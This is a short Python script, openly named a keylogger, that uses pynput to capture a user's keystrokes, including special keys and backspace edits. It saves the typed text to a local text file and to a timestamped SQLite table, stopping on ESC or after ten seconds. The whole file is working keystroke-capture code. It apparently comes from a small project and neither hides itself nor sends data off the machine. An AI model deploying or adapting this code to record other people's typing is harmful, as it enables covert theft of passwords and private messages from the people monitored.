import time
from pynput import keyboard
import sqlite3
from datetime import datetime, date

def add_to_db(res):
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    conn = sqlite3.connect('../Interface/keylogs.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS keylogs (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        date TEXT,
                        time TEXT,
                        key TEXT
                     )''')
    conn.commit()
    cursor.execute("INSERT INTO keylogs VALUES (NULL, ?, ?, ?)", (date.today().isoformat(), current_time, res,))
    conn.commit()
    conn.close()


def keylogger():
    file_path = "keylogger.txt"
    start_time = int(time.time())
    timediff = 10

    typed_text = []
    # This function will append all the typed data to the file keylogger.txt
    def write_to_file():
        with open(file_path, "a") as file:
            file.write("".join(typed_text))

    def on_press(key):
        nonlocal typed_text

        try:
            if hasattr(key, 'char') and key.char:
                typed_text.append(key.char)
            elif key == keyboard.Key.space:
                typed_text.append(" ")
            elif key == keyboard.Key.enter:
                typed_text.append("\n")
            elif key == keyboard.Key.backspace:
                if typed_text:
                    typed_text.pop()  # Handle backspace by removing the last character
            else:
                # Handle special keys and format them with angle brackets
                typed_text.append(f"<{key.name.upper()}>")
        except Exception as e:
            print(f"Error logging key: {e}")

    def on_release(key):
        """Stop the keylogger when ESC is pressed."""
        if key == keyboard.Key.esc or int(time.time()) - start_time > timediff :
            # Convert list to string using a loop
            res = ''
            for s in typed_text:
                res += s
            # Remove trailing space
            res = res.strip()
            # print(res)
            add_to_db(res)
            write_to_file()
            print("Exiting keylogger...")
            return False

    # Start the key listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    print("Keylogger started. Press 'ESC' to stop.")
    keylogger()
